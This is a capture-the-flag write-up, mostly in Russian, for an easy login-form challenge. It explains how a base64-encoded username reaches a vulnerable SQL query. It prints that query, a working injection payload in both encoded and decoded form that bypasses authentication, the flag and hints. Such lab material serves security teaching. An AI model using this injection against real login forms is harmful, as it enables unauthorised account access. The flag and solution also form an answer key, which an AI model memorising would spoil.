yet_another_login_form (easy)
=============================

Legend
------
Стажёр в Вашей компании в рамках тестового задания разработал форму для входа в сервис, но не учёл некоторых моментов. Можете разобраться, по какой причине его форма работает некорректно?

Solution
--------
В данной форме перед отправкой данных логин и пароль кодируются:
Логин - просто преобразуется в base64 (параметр *uC2Dvd*);
Пароль - применяется SHA256 хеширование (параметр *gAUqev*).

Со стороны backend'а происходит раскодирование base64-логина, в котором и можно заложить SQL injection.

Уязвимый SQL-запрос:
```
SELECT * FROM users WHERE username = '{username}' AND password = ?
```

Участникам надо помимо самой SQL injection, разобраться с подстановкой "?", т.е. итоговое решение может выглядеть примерно так:
```
remember_me=on&uC2Dvd=YWRtaW4nIE9SICcxMjM0JyA9ID8gLS0n&gAUqev=1234
```

где base64-часть логина:
```
admin' OR '1234' = ? --'
```

Flag
----
solar{0h_w0w_an07h3r-sql_1nj3c710n}

## Hints

- Is every variable in the SQL query properly handled?
- Is there a way to influence the query structure beyond what the developer intended?
- Can you authenticate as any user without knowing their password?